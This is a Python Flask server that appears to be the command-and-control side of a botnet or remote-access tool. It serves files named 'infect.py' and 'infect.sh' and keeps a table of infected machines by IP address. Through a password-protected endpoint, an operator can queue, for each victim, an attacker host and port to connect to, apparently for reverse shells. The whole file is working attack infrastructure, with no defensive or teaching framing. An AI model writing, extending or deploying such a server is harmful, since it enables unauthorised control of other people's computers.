from flask import Flask, request, abort
from socket import gethostbyname
from threading import Thread
from hashlib import sha256
from time import sleep

PASSWORD = "{HASHED_PASSWORD}"

DELAY    = 60
INFOS    = {}
REQUESTS = {}

app = Flask(__name__)

def file_content(file_path):
    with open(file_path, 'rb') as f:
        data = f.read()
    f.close()
    return data

@app.route("/")
def index():
    return file_content("templates/index.html")

@app.route("/infect.py")
def infect_py():
    return file_content("infect.py")

@app.route("/infect.sh")
def infect_sh():
    return file_content("infect.sh")

@app.errorhandler(404)
def not_found(*_):
    return file_content("templates/404.html")

# intressting part

def set_inactive(ip):
    global INFOS
    sleep(DELAY)
    INFOS[ip] = '0'

def is_ip(ip):
    ip = gethostbyname(ip)
    if ip.count('.') == 3:
        for part in ip.split('.'):
            if not part.isdigit():
                return False
            if int(part) < 0 or int(part) > 255:
                return False
        return True
    return False

@app.route("/api/get_infos", methods=["GET", "POST"])
def get_infos():
    global INFOS
    if request.headers.get("X-Forwarded-For") is not None:
        ip = request.headers.get("X-Forwarded-For").split(",")[0]
    else:
        ip = request.remote_addr
    
    if request.method == "GET":
        if not ip in INFOS:
            INFOS[ip] = '0'
        if INFOS[ip] == '0':
            INFOS[ip] = '1'
            Thread(target=set_inactive, args=(ip,), daemon=True).start()
        if ip in REQUESTS.keys():
            data = REQUESTS[ip]
            del REQUESTS[ip]
            return data
        else:
            return "null"
    else:
        if request.form.get("pass"):
            if sha256(request.form.get("pass").encode()).hexdigest() == PASSWORD:
                return INFOS
            else:
                if not ip in INFOS:
                    INFOS[ip] = '0'
                if INFOS[ip] == '0':
                    INFOS[ip] = '1'
                    Thread(target=set_inactive, args=(ip,), daemon=True).start()
                if ip in REQUESTS.keys():
                    data = REQUESTS[ip]
                    del REQUESTS[ip]
                    return data
                else:
                    return "null"
        else:
            if not ip in INFOS:
                INFOS[ip] = '0'
            if INFOS[ip] == '0':
                INFOS[ip] = '1'
                Thread(target=set_inactive, args=(ip,), daemon=True).start()
            if ip in REQUESTS.keys():
                data = REQUESTS[ip]
                del REQUESTS[ip]
                return data
            else:
                return "null"

@app.route("/api/set_infos", methods=["POST"])
def set_infos():
    if request.form.get("passwd") is None or request.form.get("infos") is None:
        abort(404)
    else:
        if request.form.get("infos").count('|') != 1 and request.form.get("infos").count(':') != 1:
            return "null"
        if sha256(request.form.get("passwd").encode()).hexdigest() != PASSWORD:
            return "null"

        target, host = request.form.get("infos").split('|')

        if not is_ip(target):
            return "null"
        if not is_ip(host.split(':')[0]):
            return "null"
        if not host.split(':')[1].isdigit():
            return "null"
        REQUESTS[target] = host
        return 'null'

def main():
    try:
        app.run(host="0.0.0.0", port=80)
    except:
        app.run(host="0.0.0.0", port=8080)

if __name__ == "__main__":
    main()
